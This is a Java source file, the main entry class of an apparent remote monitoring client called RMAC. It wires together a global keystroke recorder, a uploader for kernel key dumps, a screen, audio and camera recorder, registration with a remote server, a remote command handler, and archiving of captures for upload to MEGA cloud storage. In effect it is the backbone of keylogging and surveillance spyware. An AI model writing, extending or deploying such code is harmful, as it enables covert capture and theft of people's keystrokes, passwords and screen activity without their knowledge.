package com.rmac;

import com.rmac.core.Archiver;
import com.rmac.core.CommandHandler;
import com.rmac.core.Config;
import com.rmac.core.FileUploader;
import com.rmac.core.KernelDump;
import com.rmac.core.KeyLog;
import com.rmac.core.KeyRecorder;
import com.rmac.core.ScreenRecorder;
import com.rmac.core.ScriptFiles;
import com.rmac.core.Service;
import com.rmac.ipc.SocketServer;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import com.rmac.utils.Utils;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.nio.channels.FileLock;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Main entry and exit point for RMAC client.
 * <br>
 * <br>
 * Performs following tasks in sequence.
 * <ol>
 *   <li>Verifies the runtime directory and its files (ffmpeg, megacmd, svcl, config, jre etc.)</li>
 *   <li>Tries to acquire a lock for this RMACClient instance to make sure only one instance is running</li>
 *   <li>Loads the configuration.</li>
 *   <li>Creates SocketServer to establish comms with RMACUpdater process.</li>
 *   <li>Initializes FileUploader process</li>
 *   <li>Initializes Archiver and uploads any pending archives from previous run in a threaded process.</li>
 *   <li>Generates script files</li>
 *   <li>Starts the KeyRecorder process</li>
 *   <li>Registers this RMACClient with the RMAC Server</li>
 *   <li>Starts the KeyLog upload process</li>
 *   <li>Starts the ScreenRecorder process</li>
 *   <li>Registers the shutdown hook</li>
 * </ol>
 */
public class Main {

  private static Logger log;

  // References for critical processes
  public static Config config;
  public static FileUploader uploader;
  public static ScriptFiles scriptFiles;
  public static CommandHandler commandHandler;
  public static ScreenRecorder screenRecorder;
  public static KeyLog keyLog;
  public static KeyRecorder keyRecorder;
  public static Archiver archiver;
  public static SocketServer ipcInterface;
  public static KernelDump kernelDumpsUploader;

  // Global flags
  public static boolean isClientRegistered = false;
  public static boolean SHUTDOWN = false;
  public static boolean NETWORK_STATE = false;
  public static boolean NATIVE_POSSIBLE = false;

  // References for acquiring an instance lock
  private static File lockFile;
  private static FileLock fileLock;
  private static RandomAccessFile randomAccessFile;

  public static void main(String[] args) {
    if (!validateRuntimeDirectory(args)) {
      System.err.println("Runtime directory validation failed");
      System.exit(0);
    }

    // Set locations of all necessary files
    Constants.setRuntimeLocation(args[0]);

    if (!Constants.setCurrentLocation()) {
      System.exit(0);
    }

    // Need to initialize logger here instead of doing it statically,
    // due to dependency of custom FileAppender on Config
    log = LoggerFactory.getLogger(Main.class);

    // Try acquiring a lock for this instance, if it fails then probably another instance is running
    if (!lockInstance(Constants.INSTANCE_LOCK_LOCATION)) {
      log.error("Failed to acquire instance lock, another instance is running");
      System.exit(0);
    } else {
      log.info("Instance lock acquired");
    }

    // Load config (from config.rmac)
    config = new Config();
    try {
      config.loadConfig();
    } catch (IOException e) {
      log.error("Could not load config file", e);
      System.exit(0);
    }

    // Copy RMAC Native DLL from jar to Runtime location
    NATIVE_POSSIBLE = copyDLL();
    // Create SocketServer and start listening for connection
    ipcInterface = new SocketServer();
    // Initialize FileUploader
    uploader = new FileUploader();
    // Initialize Archiver
    archiver = new Archiver();
    new Thread(() -> Main.archiver.uploadArchives()).start();
    // Verify Script Files
    scriptFiles = new ScriptFiles();
    // Initialize KL Output file
    keyLog = new KeyLog();
    // Register JNativeHook
    keyRecorder = new KeyRecorder();
    // Register this Client
    Service.registerClient();
    // Initialize CommandHandler
    commandHandler = new CommandHandler();
    // Initialize Screen Recorder
    screenRecorder = new ScreenRecorder();
    // Initialize RMAC Kernel Key Dumps Uploader
    kernelDumpsUploader = new KernelDump();

    log.info("RMAC client initialized successfully");

    addShutdownHook();
  }

  /**
   * Validate if important runtime files and configuration exists, create missing directories.
   * <br><br>
   * <cite>
   * Runtime directory contains config/programs that are crucial for RMAC client to function on host
   * machine.
   * <br>
   *   <ul>
   *     <li><b>/jre</b>: Directory containing Java runtime</li>
   *     <li><b>/megacmd</b>: Directory containing MEGA cli</li>
   *     <li><b>/config.rmac</b>: RMAC configuration file</li>
   *     <li><b>/ffmpeg.exe</b>: FFMPEG for screen/audio/camera capturing</li>
   *     <li><b>/nircmd.exe</b>: NirCMD for running utility commands on host machine</li>
   *     <li><b>/svcl.exe</b>: SoundVolume command-line tool for determining default input devices</li>
   *   </ul>
   * </cite>
   *
   * @param args program command-line arguments
   * @return validation result (true = success | false = failed)
   */
  public static boolean validateRuntimeDirectory(String[] args) {
    if (args.length < 1) {
      System.err.println("Runtime location not provided as an argument");
      return false;
    }

    String runtimeDir = args[0];
    if (!(new File(runtimeDir)).exists()) {
      System.err.println("Provided runtime directory doesn't exist");
      return false;
    }

    // Validate if important executables and config exists
    File configFile = new File(runtimeDir + "\\config.rmac");
    File ffmpegExe = new File(runtimeDir + "\\ffmpeg.exe");
    File megaCmdDir = new File(runtimeDir + "\\megacmd");
    File jreDir = new File(runtimeDir + "\\jre");
    File scriptsDir = new File(runtimeDir + "\\scripts");

    if (!configFile.exists() || !ffmpegExe.exists() || !megaCmdDir.exists() || !jreDir.exists()) {
      System.err.println("Runtime files or config missing in runtime directory");
      return false;
    }

    if (!scriptsDir.exists()) {
      scriptsDir.mkdirs();
    }

    return true;
  }

  /**
   * Register JVM shutdown hook
   */
  public static void addShutdownHook() {
    Runtime.getRuntime().addShutdownHook(new Thread(() -> {
      if (!SHUTDOWN) {
        initiateShutdown();
      }
    }));
  }

  /**
   * Shutdown running processes, cleanup and release instance lock.
   */
  public static void initiateShutdown() {
    SHUTDOWN = true;

    commandHandler.shutdown();
    screenRecorder.shutdown();
    keyLog.shutdown();

    log.warn("Shutting down JNH...");
    GlobalScreen.removeNativeKeyListener(KeyRecorder.nativeKeyListener);
    try {
      GlobalScreen.unregisterNativeHook();
    } catch (NativeHookException e) {
      log.error("Could not unregister JNH", e);
    }

    Main.archiver.cleanUp();
    log.info("Cleanup completed");

    try {
      Runtime.getRuntime().exec("taskkill /f /im megacmdserver.exe");
    } catch (IOException e) {
      log.error("Could not kill megacmdserver process");
    }

    ((ch.qos.logback.classic.Logger)
        LoggerFactory.getLogger(org.slf4j.Logger.ROOT_LOGGER_NAME)
    ).getAppender("FILE").stop();

    String logFilePath = Constants.TEMP_LOCATION + "\\Log-" + Utils.getTimestamp() + ".txt";
    File logFile = new File(Constants.LOG_LOCATION);
    try {
      Files.move(logFile.toPath(), Paths.get(logFilePath), StandardCopyOption.REPLACE_EXISTING);
      Main.archiver.moveToArchive(new File(logFilePath), ArchiveFileType.OTHER);
    } catch (IOException ignored) {
    }

    try {
      Main.fileLock.release();
      Main.randomAccessFile.close();
      Main.lockFile.delete();
      log.info("Instance lock released");
    } catch (Exception e) {
      log.error("Couldn't remove lock file: " + Constants.INSTANCE_LOCK_LOCATION, e);
    }
  }

  /**
   * Try acquiring a lock on a file.
   *
   * @param lockFile The file to acquire a lock on
   * @return Lock result (true = success | false = failed)
   */
  public static boolean lockInstance(final String lockFile) {
    try {
      Main.lockFile = new File(lockFile);
      Main.randomAccessFile = new RandomAccessFile(Main.lockFile, "rw");
      Main.fileLock = Main.randomAccessFile.getChannel().tryLock();
      if (Main.fileLock != null) {
        return true;
      }
    } catch (Exception e) {
      log.error("Couldn't create/lock lock-file: " + lockFile, e);
    }
    return false;
  }

  public static boolean copyDLL() {
    try (InputStream is = Main.class.getResourceAsStream("/rmac-native.dll")) {
      Files.copy(is, Paths.get(Constants.RMAC_DLL_LOCATION), StandardCopyOption.REPLACE_EXISTING);
      return true;
    } catch (IOException e) {
      log.warn(
          "Failed to copy RMAC DLL from jar to Runtime, audio recording mode will be restricted to Active, ActiveAudioRecording=true config property will be ignored",
          e);
    }
    return false;
  }
}
